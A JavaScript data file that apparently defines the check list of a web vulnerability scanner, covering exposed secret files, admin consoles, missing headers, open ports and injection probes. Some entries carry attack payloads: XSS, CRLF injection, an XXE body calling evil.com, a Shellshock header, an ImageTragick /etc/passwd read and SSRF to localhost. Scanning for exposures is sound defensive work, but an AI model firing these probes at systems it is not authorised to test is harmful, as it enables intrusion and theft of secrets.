export const newWeb = [
    {
        title: "Sensitive File: .env",
        rootPaths: ["/.env"],
        detectResponses: ["DB_HOST", "DB_USER", "DB_PASSWORD"],
        tags: ["all"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Sensitive File: wp-config.php",
        rootPaths: ["/wp-config.php"],
        detectResponses: ["DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST"],
        tags: ["wordpress"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Sensitive File: config.json",
        rootPaths: ["/config.json"],
        detectResponses: ["\"password\"", "\"secret\""],
        tags: ["all"],
        dog: "dog-omg",
        critLevel: 2
    },
    {
        title: "Exposed Git Directory",
        rootPaths: ["/.git/config"],
        detectResponses: ["[core]"],
        tags: ["all"],
        dog: "dog-panic",
        critLevel: 3
    },
    {
        title: "Exposed SVN Directory",
        rootPaths: ["/.svn/entries"],
        detectResponses: ["dir"],
        tags: ["all"],
        dog: "dog-panic",
        critLevel: 3
    },
    {
        title: "Directory Listing Enabled",
        rootPaths: ["/"],
        detectResponses: ["Index of /", "Parent Directory"],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "PHP Info File",
        rootPaths: ["/phpinfo.php", "/info.php"],
        detectResponses: ["PHP Version"],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Server Status Exposed",
        rootPaths: ["/server-status"],
        detectResponses: ["Apache Server Status"],
        tags: ["apache"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Spring Boot Actuators Exposed",
        rootPaths: ["/actuator/health", "/health"],
        detectResponses: ["{\"status\":\"UP\"}"],
        tags: ["java", "springboot"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "Jenkins Script Console",
        rootPaths: ["/script"],
        detectResponses: ["Jenkins Script Console"],
        tags: ["jenkins"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "XSS via 'message' parameter",
        params: ["<script>alert('XSS')</script>"],
        detectResponses: ["<script>alert('XSS')</script>"],
        tags: ["get-param"],
        dog: "dog-love",
        critLevel: 2
    },
    {
        title: "Log File Exposure: access.log",
        rootPaths: ["/access.log", "/logs/access.log"],
        detectResponses: ["GET /", "POST /"],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Log File Exposure: error.log",
        rootPaths: ["/error.log", "/logs/error.log"],
        detectResponses: ["PHP Fatal error", "Exception"],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Backup File: database.sql",
        rootPaths: ["/database.sql", "/db.sql", "/backup.sql"],
        detectResponses: ["CREATE TABLE", "INSERT INTO"],
        tags: ["all"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Swagger UI Exposed",
        rootPaths: ["/swagger-ui.html", "/api/swagger-ui.html"],
        detectResponses: ["Swagger UI"],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Laravel Telescope Exposed",
        rootPaths: ["/telescope"],
        detectResponses: ["Telescope"],
        tags: ["laravel", "php"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "Debug Mode Enabled (Django)",
        rootPaths: ["/"],
        detectResponses: ["DisallowedHost"],
        tags: ["django", "python"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "Debug Mode Enabled (Laravel)",
        rootPaths: ["/"],
        detectResponses: ["Whoops! There was an error."],
        tags: ["laravel", "php"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "CORS Misconfiguration: Wildcard",
        headers: { "Origin": "https://evil.com" },
        detectHeaders: ["Access-Control-Allow-Origin: *", "Access-Control-Allow-Origin: https://evil.com"],
        tags: ["all"],
        dog: "dog-love",
        critLevel: 2
    },
    {
        title: "Missing X-Frame-Options Header",
        detectHeaders: [],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Missing Content-Security-Policy Header",
        detectHeaders: [],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Missing X-Content-Type-Options Header",
        detectHeaders: [],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Missing Strict-Transport-Security Header",
        detectHeaders: [],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Server Version Disclosure (Apache)",
        detectHeaders: ["Server: Apache"],
        tags: ["apache"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Server Version Disclosure (Nginx)",
        detectHeaders: ["Server: nginx"],
        tags: ["nginx"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "PHP Version Disclosure (X-Powered-By)",
        detectHeaders: ["X-Powered-By: PHP"],
        tags: ["php"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "ASP.NET Version Disclosure (X-Powered-By)",
        detectHeaders: ["X-Powered-By: ASP.NET"],
        tags: ["asp.net"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Joomla! Admin Interface",
        rootPaths: ["/administrator/"],
        detectResponses: ["Joomla! Administration"],
        tags: ["joomla"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Drupal Admin Interface",
        rootPaths: ["/user/login"],
        detectResponses: ["Drupal"],
        tags: ["drupal"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Magento Admin Interface",
        rootPaths: ["/admin/"],
        detectResponses: ["Magento Admin"],
        tags: ["magento"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "phpMyAdmin Setup",
        rootPaths: ["/phpmyadmin/setup/"],
        detectResponses: ["phpMyAdmin setup"],
        tags: ["phpmyadmin"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "WebDAV Enabled",
        method: "OPTIONS",
        rootPaths: ["/"],
        detectHeaders: ["DAV"],
        tags: ["all"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "TRACE Method Enabled",
        method: "TRACE",
        rootPaths: ["/"],
        detectResponses: ["TRACE / HTTP/1.1"],
        tags: ["all"],
        dog: "dog-love",
        critLevel: 2
    },
    {
        title: "Open Redirect (//evil.com)",
        params: ["//evil.com"],
        detectStatusCodes: ["301", "302"],
        detectHeaderValues: [
            { header: "Location", pattern: "^\\/\\/evil\\.com(?:\\/|$)", flags: "i" }
        ],
        isRedirected: true,
        tags: ["get-param"],
        dog: "dog-love",
        critLevel: 2
    },
    {
        title: "Open Redirect (https://evil.com)",
        params: ["https://evil.com"],
        detectStatusCodes: ["301", "302"],
        detectHeaderValues: [
            { header: "Location", pattern: "^https:\\/\\/evil\\.com(?:\\/|$)", flags: "i" }
        ],
        isRedirected: true,
        tags: ["get-param"],
        dog: "dog-love",
        critLevel: 2
    },
    {
        title: "CRLF Injection",
        params: ["%0d%0aSet-Cookie:crlf=true"],
        detectHeaderValues: [
            { header: "Set-Cookie", contains: "crlf=true" }
        ],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Out-of-Band XML External Entity (OOB-XXE)",
        postBody: "<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://evil.com/oob\"> %xxe;]>",
        tags: ["post-request"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Server-Side Request Forgery (SSRF)",
        params: ["http://127.0.0.1:22", "http://localhost:22"],
        detectResponses: ["SSH-2.0-OpenSSH"],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Prototype Pollution",
        params: ["__proto__[polluted]=true"],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "GraphQL IDE Exposed",
        rootPaths: ["/graphql", "/graphiql"],
        detectResponses: ["GraphQL"],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Rails Web Console Exposed",
        rootPaths: ["/rails/web_console"],
        detectResponses: ["Web Console"],
        tags: ["rails"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "SSTI (Server-Side Template Injection) - Jinja2",
        params: ["{{7*7}}"],
        detectResponses: ["49"],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "SSTI (Server-Side Template Injection) - Twig",
        params: ["{{7*7}}"],
        detectResponses: ["49"],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "SSTI (Server-Side Template Injection) - Freemarker",
        params: ["${7*7}"],
        detectResponses: ["49"],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "AEM Groovy Console",
        rootPaths: ["/groovyconsole"],
        detectResponses: ["Groovy Console"],
        tags: ["aem"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Apache Struts DevMode",
        params: ["?debug=browser"],
        detectResponses: ["Struts Development Mode"],
        tags: ["struts"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "ColdFusion Admin",
        rootPaths: ["/CFIDE/administrator/"],
        detectResponses: ["ColdFusion Administrator Login"],
        tags: ["coldfusion"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Liferay Portal",
        rootPaths: ["/"],
        detectResponses: ["Liferay"],
        tags: ["liferay"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Sitecore Admin",
        rootPaths: ["/sitecore/login"],
        detectResponses: ["Sitecore"],
        tags: ["sitecore"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Tomcat Manager",
        rootPaths: ["/manager/html"],
        detectStatusCodes: ["401", "403"],
        tags: ["tomcat"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "JBoss Admin Console",
        rootPaths: ["/admin-console/"],
        detectResponses: ["JBoss Management"],
        tags: ["jboss"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "WebSphere Admin Console",
        rootPaths: ["/ibm/console/"],
        detectResponses: ["WebSphere Application Server"],
        tags: ["websphere"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "GlassFish Admin Console",
        rootPaths: ["/common/index.jsf"],
        detectResponses: ["GlassFish Server"],
        tags: ["glassfish"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "Ruby on Rails Secret Token",
        rootPaths: ["/config/initializers/secret_token.rb"],
        detectResponses: ["secret_key_base"],
        tags: ["rails"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Elixir Phoenix Secret",
        rootPaths: ["/config/prod.secret.exs"],
        detectResponses: ["secret_key_base"],
        tags: ["elixir", "phoenix"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "PHP Composer Lock File",
        rootPaths: ["/composer.lock"],
        detectResponses: ["\"name\":", "\"version\":"],
        tags: ["php"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Node.js Package Lock File",
        rootPaths: ["/package-lock.json"],
        detectResponses: ["\"name\":", "\"version\":"],
        tags: ["nodejs"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Python Pipfile",
        rootPaths: ["/Pipfile"],
        detectResponses: ["[[source]]"],
        tags: ["python"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Ruby Gemfile.lock",
        rootPaths: ["/Gemfile.lock"],
        detectResponses: ["GEM"],
        tags: ["ruby"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Exposed .DS_Store file",
        rootPaths: ["/.DS_Store"],
        detectResponses: [".DS_Store"],
        tags: ["all"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Exposed 'WEB-INF/web.xml' file",
        rootPaths: ["/WEB-INF/web.xml"],
        detectResponses: ["<web-app"],
        tags: ["java"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "ThinkPHP Debug Console",
        rootPaths: ["/"],
        detectResponses: ["ThinkPHP"],
        tags: ["thinkphp"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "HTTPoxy Vulnerability",
        headers: { "Proxy": "http://evil.com" },
        tags: ["all"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Shellshock Vulnerability",
        headers: { "User-Agent": "() { :;}; /bin/sleep 5" },
        tags: ["all"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "ImageTragick Vulnerability",
        postBody: "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://127.0.0.1/etc/passwd'",
        tags: ["post-request"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Heartbleed Vulnerability",
        ports: ["443"],
        tags: ["openssl"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "POODLE Vulnerability",
        ports: ["443"],
        tags: ["openssl"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "DROWN Vulnerability",
        ports: ["443"],
        tags: ["openssl"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "FREAK Vulnerability",
        ports: ["443"],
        tags: ["openssl"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Logjam Vulnerability",
        ports: ["443"],
        tags: ["openssl"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "GitLab User Enumeration",
        rootPaths: ["/users/sign_in"],
        detectResponses: ["\"password_sign_in\""],
        tags: ["gitlab"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Sentry Installation",
        rootPaths: ["/_static/sentry/"],
        detectResponses: ["Sentry"],
        tags: ["sentry"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Kibana Exposed",
        rootPaths: ["/app/kibana"],
        detectResponses: ["Kibana"],
        tags: ["kibana"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "Elasticsearch Exposed",
        ports: ["9200"],
        detectResponses: ["You Know, for Search"],
        tags: ["elasticsearch"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "MongoDB Exposed",
        ports: ["27017"],
        tags: ["mongodb"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Redis Exposed",
        ports: ["6379"],
        tags: ["redis"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Memcached Exposed",
        ports: ["11211"],
        tags: ["memcached"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Rsync Exposed",
        ports: ["873"],
        tags: ["rsync"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "FTP Exposed",
        ports: ["21"],
        tags: ["ftp"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "SSH Exposed",
        ports: ["22"],
        tags: ["ssh"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "Telnet Exposed",
        ports: ["23"],
        tags: ["telnet"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "SMTP Exposed",
        ports: ["25"],
        tags: ["smtp"],
        dog: "dog-panic",
        critLevel: 2
    },
    {
        title: "DNS Zone Transfer",
        subdomains: ["ns1", "ns2"],
        tags: ["all"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Microsoft Exchange Autodiscover",
        rootPaths: ["/Autodiscover/Autodiscover.xml"],
        detectResponses: ["<ErrorCode>"],
        tags: ["exchange"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Citrix Gateway",
        rootPaths: ["/vpn/index.html"],
        detectResponses: ["Citrix Gateway"],
        tags: ["citrix"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Fortinet SSL VPN",
        rootPaths: ["/remote/login"],
        detectResponses: ["FortiToken"],
        tags: ["fortinet"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Pulse Secure SSL VPN",
        rootPaths: ["/dana-na/auth/url_default/welcome.cgi"],
        detectResponses: ["Pulse Secure"],
        tags: ["pulsesecure"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Palo Alto GlobalProtect",
        rootPaths: ["/global-protect/login.esp"],
        detectResponses: ["GlobalProtect"],
        tags: ["paloalto"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "BIG-IP F5",
        rootPaths: ["/my.policy"],
        detectResponses: ["BIG-IP"],
        tags: ["f5"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Atlassian Confluence",
        rootPaths: ["/login.action"],
        detectResponses: ["Confluence"],
        tags: ["atlassian"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Atlassian Jira",
        rootPaths: ["/secure/Dashboard.jspa"],
        detectResponses: ["Jira"],
        tags: ["atlassian"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Atlassian Bitbucket",
        rootPaths: ["/login"],
        detectResponses: ["Bitbucket"],
        tags: ["atlassian"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Artifactory",
        rootPaths: ["/artifactory/"],
        detectResponses: ["Artifactory"],
        tags: ["artifactory"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "Nexus Repository Manager",
        rootPaths: ["/nexus/"],
        detectResponses: ["Nexus Repository Manager"],
        tags: ["nexus"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "TeamCity",
        rootPaths: ["/login.html"],
        detectResponses: ["TeamCity"],
        tags: ["teamcity"],
        dog: "dog-laugh",
        critLevel: 1
    },
    {
        title: "GoCD",
        rootPaths: ["/go/auth/login"],
        detectResponses: ["GoCD"],
        tags: ["gocd"],
        dog: "dog-laugh",
        critLevel: 1
    }
];
